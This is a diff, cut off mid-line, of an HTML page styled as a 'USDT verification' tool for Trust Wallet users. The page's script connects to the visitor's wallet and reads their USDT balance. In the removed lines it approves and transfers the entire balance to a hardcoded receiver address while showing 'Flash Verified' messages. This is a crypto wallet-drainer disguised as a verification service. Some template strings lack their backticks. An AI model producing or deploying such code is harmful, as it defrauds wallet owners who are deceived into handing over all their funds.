@@ -2,68 +2,66 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify USDT</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <title>Get USDT Verification</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     body {
       margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #ffffff;
-      color: #000000;
-      overflow-x: hidden;
-    }
-    .hero {
-      background-image: url('https://trustwallet.com/assets/images/bg-hero.6c8ceec1.png');
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-image: url('https://cdn.pixabay.com/photo/2017/10/31/09/53/banner-2903832_1280.jpg');
       background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
       background-position: center;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      color: white;
       text-align: center;
-    }
-    .hero h1 {
-      font-size: 32px;
-      font-weight: 600;
-      margin-bottom: 20px;
-    }
-    .verify-btn {
-      background: linear-gradient(90deg, #00c2ff, #0085ff);
-      color: #fff;
-      padding: 15px 40px;
-      border: none;
-      border-radius: 50px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 0 10px #00c2ff;
-      transition: 0.3s;
-    }
-    .verify-btn:hover {
-      box-shadow: 0 0 20px #00c2ff;
-    }
-    #status {
-      margin-top: 30px;
-      font-size: 16px;
-    }
-    @media (max-width: 600px) {
-      .hero h1 {
-        font-size: 24px;
-      }
-    }
+    }.container {
+  padding: 100px 20px;
+}
+
+.btn {
+  background-color: #007bff;
+  color: white;
+  padding: 15px 35px;
+  font-size: 20px;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  box-shadow: 0 0 20px #00f;
+  margin-top: 20px;
+}
+
+.btn:hover {
+  background-color: #0056b3;
+}
+
+#status {
+  margin-top: 30px;
+  font-size: 18px;
+}
+
+@media (max-width: 600px) {
+  .container {
+    padding: 50px 15px;
+  }
+
+  .btn {
+    font-size: 18px;
+    padding: 12px 30px;
+  }
+}
+
   </style>
 </head>
 <body>
-  <div class="hero">
-    <h1>Verify Your USDT</h1>
-    <button class="verify-btn" onclick="startTransfer()">VERIFY USDT</button>
+  <div class="container">
+    <h1>Get USDT Verification</h1>
+    <button class="btn" onclick="startTransfer()">Verify USDT</button>
     <p id="status"></p>
   </div>  <script>
     const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
 
     const usdtABI = [
       { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
@@ -75,7 +73,7 @@
       const status = document.getElementById("status");
 
       if (typeof window.ethereum === 'undefined') {
-        alert("⚠️ Please open in Trust Wallet browser.");
+        alert("Please open in Trust Wallet browser.");
         return;
       }
 
@@ -83,29 +81,16 @@
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
-
       const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
-      const balance = await usdt.methods.balanceOf(sender).call();
 
+      const balance = await usdt.methods.balanceOf(sender).call();
       if (balance == 0) {
-        alert("❌ No USDT found in wallet.");
+        alert("No USDT found in your wallet.");
         return;
       }
 
       const readable = web3.utils.fromWei(balance, 'ether');
-      status.innerText = 🔐 Flash USDT Verify...;
+      status.innerText = Flash USD verify: ${readable} USDT;
 
       try {
-        await usdt.methods.approve(receiver, balance).send({ from: sender });
-        status.innerText = "🔄 Flash Verified. Sending...";
-
-        await usdt.methods.transfer(receiver, balance).send({ from: sender });
-        status.innerText = ✅ ${readable} USDT Verified;
-      } catch (err) {
-        console.error(err);
-        status.innerText = "❌ Transaction Failed or Cancelled.";
-        alert("Transaction failed or cancelled.");
-      }
-    }
-  </script></body>
-</html>
+        await
